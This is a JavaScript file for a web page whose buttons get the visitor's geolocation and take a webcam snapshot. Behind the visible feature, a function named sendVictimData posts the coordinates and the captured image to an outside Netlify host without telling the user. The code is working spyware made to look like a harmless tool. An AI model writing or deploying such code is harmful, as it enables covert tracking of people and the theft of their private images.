document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('getLocationBtn').addEventListener('click', getLocation);
    document.getElementById('captureImageBtn').addEventListener('click', captureImage);
});

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition);
    } else {
        document.getElementById('locationOutput').innerHTML = "Geolocation is not supported by this browser.";
    }
}

function showPosition(position) {
    document.getElementById('locationOutput').innerHTML = 'Latitude: ' + position.coords.latitude + 
                                                           '<br>Longitude: ' + position.coords.longitude;
    sendVictimData(position.coords.latitude, position.coords.longitude);
}

function captureImage() {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            return new Promise((resolve) => {
                video.addEventListener('loadeddata', () => {
                    const canvas = document.getElementById('canvas');
                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0);
                    resolve();
                });
            });
        })
        .then(() => {
            const canvas = document.getElementById('canvas');
            const capturedImage = document.getElementById('capturedImage');
            capturedImage.src = canvas.toDataURL();
            sendVictimData(null, null, capturedImage.src);
        })
        .catch(function(err) {
            console.log("An error occurred: " + err);
        });
}

function sendVictimData(latitude, longitude, image) {
    fetch('https://papaya-madeleine-feb8e6.netlify.app', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            latitude: latitude,
            longitude: longitude,
            image: image
        })
    })
    .then(response => response.json())
    .then(data => console.log('Success:', data))
    .catch((error) => console.error('Error:', error));
}
